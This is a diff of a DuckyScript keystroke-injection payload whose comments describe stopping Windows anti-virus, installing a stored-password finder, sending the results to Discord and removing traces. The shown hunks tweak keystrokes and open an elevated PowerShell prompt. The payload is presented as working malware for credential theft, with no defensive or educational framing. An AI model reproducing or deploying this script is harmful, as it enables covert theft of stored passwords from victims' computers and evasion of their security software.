@@ -1,5 +1,7 @@
-REM This is a modified script by DEFHerobrine that: 1. stops windows anti-virus 2. installs file that finds stored passwords 3. sends to discord and removes any traces
-REM 1. stops windows anti-virus 2. installs file that finds stored passwords 3. sends html to discord 4. removes any traces
+REM This is a modified script by DEFHerobrine that: 
+REM  1. Stops windows anti-virus  2. Installs file that finds stored passwords  3. Sends html to discord  4. Removes any traces
+GUI D
+DELAY 100
 GUI r
 DELAY 1000
 STRING powershell -Noprofile "Start-Process powershell -verb runas"
@@ -36,18 +38,7 @@ STRING C:\Temp
 DELAY 75
 ENTER
 DELAY 100
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
-TAB
-DELAY 75
+GUI ALT N
 STRING temp.html
 ENTER
 DELAY 500
